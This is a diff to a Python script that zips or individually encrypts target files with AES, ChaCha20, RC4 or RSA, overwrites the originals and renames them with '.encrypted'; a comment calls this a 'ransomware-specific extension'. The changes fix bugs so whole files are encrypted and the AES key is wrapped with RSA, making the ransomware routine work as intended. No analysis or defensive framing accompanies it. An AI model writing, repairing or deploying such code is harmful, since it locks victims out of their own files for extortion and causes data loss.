@@ -63,9 +63,8 @@ def rsa_encrypt(data, public_key):
 
 def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=None, target_files=None, directory=None):
     """
-    Zips all target files if zip_type is specified and encrypts the zip file.
+    Zips all target files if zip_type is specified and encrypts the zip file or individual files.
     """
-    # Step 1: Handle Zipping of Files if zip_type is specified
     if zip_type and zip_type.lower() != "none":
         zip_file_path = os.path.join(directory, "encrypted_files.zip")
 
@@ -75,23 +74,21 @@ def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=N
                 zipf.write(target, os.path.basename(target))
                 print(f"Added {target} to {zip_file_path}")
 
-        # Encrypt the zip file instead of individual files
         file_path = zip_file_path
 
-        # Read the file data
+        # Encrypt the zip file
         with open(file_path, "rb") as file:
             file_data = file.read()
 
-        # Step 2: Choose encryption algorithm based on enc_type
         if enc_type == "AES":
             encrypted_data = aes_encrypt(file_data, key)
         elif enc_type == "ChaCha20":
-            nonce = os.urandom(12)  # ChaCha20 typically uses a 12-byte nonce
+            nonce = os.urandom(12)
             encrypted_data = chacha20_encrypt(file_data, key, nonce)
         elif enc_type == "RC4":
             encrypted_data = rc4_encrypt(file_data, key)
         elif enc_type == "RSA":
-            encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
+            raise ValueError("RSA cannot encrypt large data directly. Use AES + RSA or ChaCha20 + RSA.")
         elif enc_type == "AES + RSA":
             encrypted_data = aes_encrypt(file_data, key)
             encrypted_key = rsa_encrypt(key, rsa_key.public_key())
@@ -108,11 +105,8 @@ def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=N
 
         # Rename zip file with .encrypted extension
         encrypted_zip_path = f"{zip_file_path}.encrypted"
-        
-        # Check if file already exists, if so, remove it
         if os.path.exists(encrypted_zip_path):
             os.remove(encrypted_zip_path)
-            
         os.rename(zip_file_path, encrypted_zip_path)
         print(f"Zip file encrypted and renamed to {encrypted_zip_path}")
 
@@ -120,11 +114,8 @@ def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=N
         print("No zipping required, proceeding with individual file encryption...")
         for file_path in target_files:
             # Encrypt each file individually
-            file_size_type = check_file_size(file_path)
-            read_size = None if file_size_type == 'full' else 64
-
             with open(file_path, "rb") as file:
-                file_data = file.read() if read_size is None else file.read(read_size)
+                file_data = file.read()
 
             if enc_type == "AES":
                 encrypted_data = aes_encrypt(file_data, key)
@@ -134,16 +125,18 @@ def encrypt_and_zip_files(enc_type, enc_algo, key=None, rsa_key=None, zip_type=N
             elif enc_type == "RC4":
                 encrypted_data = rc4_encrypt(file_data, key)
             elif enc_type == "RSA":
-                encrypted_data = rsa_encrypt(file_data, rsa_key.public_key())
+                encrypted_data = rsa_encrypt(file_data[:245], rsa_key.public_key())  # RSA size limit
             elif enc_type == "AES + RSA":
                 encrypted_data = aes_encrypt(file_data, key)
-                encrypted_data = rsa_encrypt(encrypted_data, rsa_key.public_key())
-            
+                encrypted_key = rsa_encrypt(key, rsa_key.public_key())
+                encrypted_data = encrypted_key + encrypted_data
+
+            # Write encrypted data back to the file
             with open(file_path, "wb") as file:
                 file.write(encrypted_data)
-            
-            add_extension(file_path, ".encrypted")
 
+            # Add extension
+            add_extension(file_path, ".encrypted")
 
 # Add ransomware-specific extension to the file
 def add_extension(file_path, extension):
